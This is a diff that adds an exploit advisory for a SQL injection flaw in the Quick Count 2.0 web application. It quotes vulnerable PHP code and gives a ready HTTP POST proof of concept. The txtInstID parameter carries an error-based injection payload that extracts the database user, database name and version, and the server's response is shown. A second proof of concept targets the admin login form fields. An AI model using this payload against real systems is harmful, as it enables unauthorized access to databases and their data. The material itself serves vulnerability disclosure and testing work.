@@ -1,0 +1,83 @@
+# Exploit Title: Quick Count 2.0 - 'txtInstID' SQL Injection
+# Dork: N/A
+# Date: 2018-10-25
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://quickcount.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/quickcount/files/latest/download
+# Version: 2.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/QCVote.php
+# 
+# [PATH]/QCVote.php
+# ....
+# 90  $_SESSION['glbInstID'] = "";
+# 91  if ($_SERVER["REQUEST_METHOD"] == "POST") {
+# 92  // collect value of input field
+# 93  if (isset($_REQUEST['txtInstID'])) {
+# 94  $name = $_REQUEST['txtInstID'];           
+# 95  }
+# 96  if (isset($_REQUEST['btnA'])) {
+# 97  $btnAVal = $_REQUEST['btnA'];
+# 98  }
+# 99  if (isset($_REQUEST['btnB'])) {
+# 100               $btnBVal = $_REQUEST['btnB'];
+# 101               }
+# 102 if (isset($_REQUEST['btnC'])) {
+# 103 $btnCVal = $_REQUEST['btnC'];
+# 104 }
+# 105 if (isset($_REQUEST['btnD'])) {
+# 106 $btnDVal = $_REQUEST['btnD'];
+# 107 }
+# 108 if (isset($_REQUEST['btnE'])) {
+# 109 $btnEVal = $_REQUEST['btnE'];
+# 110 }
+# ....
+# 
+
+POST /[PATH]/QCVote.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 268
+txtInstID=12'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'
+HTTP/1.1 200 OK
+Date: Thu, 25 Oct 2018 16:35:16 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=q360l936bjohek90ekaj85b0r4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 5976
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/QCAdmin.php
+# 
+# [PATH]/QCAdmin.php
+
+Post/txtLogID=&txtLogPW=&txtSC=&txtExpDt=&txtSchName=&txtDept=&btnLogin=Login&txtInstClr=&txtLoginout=LoggedOUT
+
+# ....
+#201 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+#202 // collect value of input field
+#203 if (isset($_REQUEST['txtLogID'])) {
+#204 $txtLogIDVal = $_REQUEST['txtLogID'];
+#205 $_SESSION['glbLogID']=$txtLogIDVal;           
+#206 }
+#207 if (isset($_REQUEST['txtLogPW'])) {
+#208 $txtLogPWVal = $_REQUEST['txtLogPW'];
+#209 $_SESSION['glbLogPW'] = $txtLogPWVal;
+# ....Etc....
